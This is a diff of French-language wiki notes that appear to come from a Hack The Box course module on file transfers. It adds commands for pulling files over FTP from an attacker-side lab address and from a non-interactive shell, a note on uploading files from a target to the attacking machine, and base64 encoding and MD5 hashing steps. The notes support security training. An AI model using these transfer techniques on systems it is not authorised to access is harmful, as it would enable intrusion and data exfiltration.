@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T12:41:30.205Z
+date: 2025-03-29T12:52:13.799Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -176,5 +176,48 @@ Transferer des fichiers depuis le serveur FTP avec la classe PowerShell Net.WebC
 
 ```
 (New-Object Net.WebClient).DownloadFile('ftp://<adresse>/<fichier>', '<fichier de sortie>')
+```
+
+Il est aussi possible de créer un fichier de commande FTP, cela est utile si le shell actuel n'est pas interactif.
+
+```
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+### Upload Operations
+
+Pour transferer des fichiers depuis la cible vers la machine attaquante, il est possible d'utiliser les mêmes méthodes que vue précédemment.
+
+### PowerShell Base64 Encode & Decode
+
+Nous avons vu précédemment comment encoder un fichier en base64.
+
+
+Pour encoder un fichier en base64 avec PowerShell:
+
+```
+[Convert]::ToBase64String((Get-Content -path "<fichier>" -Encoding byte))
+```
+
+Pour récupérer le hash MD5 d'un fichier avec PowerShell:
+
+```
+Get-FileHash "<fichier>" -Algorithm MD5 | select Hash
+```
+
+Pour décoder un fichier en base64 sur Linux:
+
+```
+echo <châine encodée> | base64 -d > <fichier de sortie>
+```
+
+Pour récupérer le hash MS d'un fichier sur Linux:
+```
+md5sum <fichier>
 ```
 
